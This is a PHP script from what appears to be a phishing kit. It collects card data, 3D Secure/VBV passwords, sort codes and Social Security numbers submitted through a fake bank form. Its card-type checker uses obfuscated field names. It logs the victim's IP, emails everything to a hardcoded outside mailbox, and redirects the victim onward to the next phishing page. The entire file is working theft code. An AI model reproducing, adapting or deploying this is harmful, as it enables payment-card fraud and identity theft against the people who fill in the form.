<?php include "encriptar.php";?>
<?php

include"bots.php";



function xboomber_check_cc($cardNumber)
{
    $cardNumber = preg_replace('/\D/', '', $cardNumber);

    $len = strlen($cardNumber);
    if ($len < 15 || $len > 16) {
       return ("invalid");
    }
    else {
        switch($cardNumber) {
            case(preg_match ('/^4/', $cardNumber) >= 1):
                return 'Visa';
            case(preg_match ('/^5[1-5]/', $cardNumber) >= 1):
                return 'Mastercard';
            case(preg_match ('/^3[47]/', $cardNumber) >= 1):
                return 'Amex';
            case(preg_match ('/^3(?:0[0-5]|[68])/', $cardNumber) >= 1):
                return 'Diners Club';
            case(preg_match ('/^6(?:011|5)/', $cardNumber) >= 1):
                return 'Discover';
            case(preg_match ('/^(?:2131|1800|35\d{3})/', $cardNumber) >= 1):
                return 'JCB';
            default:
                return ("invalid");
                break;
        }
    }
}

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

if (!empty($_POST['cnum']) && xboomber_check_cc($_POST['cnum']) != "invalid" && $_POST['emonth'] != "Month" && $_POST['eyear'] != "Year")
{
$message .= "=========[VBV INFOS]=========\n";
$message .= "Card Holder		: ".$_POST['naonca']."\n";
$message .= "Card Number		: ".$_POST['cnum']."\n";
$message .= "CVC			  : ".$_POST['c22d']."\n";
$message .= "Exp Date		: ".$_POST['emonth']."/".$_POST['eyear']."\n";
$message .= "3D / VBV		: ".$_POST['_3d']."\n";
$message .= "Sort Code		: ".$_POST['c522a']."\n";
$message .= "SSN			  : ".$_POST['ca22']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "=========[VBV INFOS]=========";

include 'MonEmail.php';
$subject = "VBV INFOS FROM [$ip]";
$to="the-pay-pal@hotmail.com";
mail($to, $subject, $message);
header("Location:websc-bank.php");
}
else
{
header("Location:carding.php");
}



?>